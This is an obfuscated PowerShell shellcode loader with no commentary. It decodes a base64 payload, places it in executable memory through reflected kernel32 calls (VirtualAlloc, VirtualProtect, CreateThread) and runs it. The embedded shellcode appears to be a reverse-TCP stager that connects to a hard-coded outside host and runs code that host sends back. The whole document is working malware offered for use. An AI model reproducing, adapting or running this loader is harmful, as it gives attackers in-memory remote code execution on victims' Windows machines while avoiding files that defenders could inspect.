function eIuG {
        Param ($d3v, $m9)
        $jmW = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jmW.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jmW.GetMethod('GetModuleHandle')).Invoke($null, @($d3v)))), $m9))
}

function wtbN {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $nz_WN,
                [Parameter(Position = 1)] [Type] $zPoz = [Void]
        )

        $eZ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $eZ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $nz_WN).SetImplementationFlags('Runtime, Managed')
        $eZ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $zPoz, $nz_WN).SetImplementationFlags('Runtime, Managed')

        return $eZ.CreateType()
}

[Byte[]]$ytS = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB0TAHQi0gYi1ggAdNQhcl0PEmLNIsB1jH/McDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoNBjLZWgCAB3xieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V")
[Uint32]$hAKM = 0
$lm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll VirtualAlloc), (wtbN @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $ytS.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($ytS, 0, $lm, $ytS.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll VirtualProtect), (wtbN @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lm, [Uint32]$ytS.Length, 0x10, [Ref]$hAKM)) -eq $true) {
        $ePk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll CreateThread), (wtbN @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lm,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eIuG kernel32.dll WaitForSingleObject), (wtbN @([IntPtr], [Int32]))).Invoke($ePk,0xffffffff) | Out-Null
}
